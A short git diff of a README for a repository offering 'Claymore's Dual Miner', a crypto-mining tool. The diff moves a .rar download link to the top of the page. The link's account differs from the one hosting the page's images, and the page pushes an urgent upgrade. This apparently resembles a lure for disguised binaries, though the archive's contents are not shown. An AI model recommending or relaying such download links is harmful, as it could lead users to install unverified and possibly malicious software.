@@ -5,8 +5,8 @@
 
 <p align="center">
 <img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/Activity/date.svg" />
-
  
+- [ ] [Download Claymore's Dual v15.0 for Windows & Linux](https://github.com/BTC-Hub/Claymore-Dual-Miner/releases/download/ClaymoresDual/Claymore.s.Dual.Miner.rar)
 
  <img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/Activity/uptime.svg" />
 </p>
@@ -19,9 +19,6 @@ Claymore today used by thousands of satisfied users.
 So, thank you so much for joining us!
 
 ![image](https://github.com/BTC-Hub/Claymore-Dual-Miner/assets/82038224/e8d323ca-97ef-434b-b488-29b2aeb74b69)
-
-[Download Claymore's Dual v15.0 for Windows & Linux](https://github.com/BTC-Hub/Claymore-Dual-Miner/releases/download/ClaymoresDual/Claymore.s.Dual.Miner.rar)
-------------------------------------------------------------------
 
 NOTE: please upgrade to v15.0 as soon as possible, old versions support up to #299 epoch only, they will fail then!
 v15.0 supports up to #384 epoch (4GB DAG size).
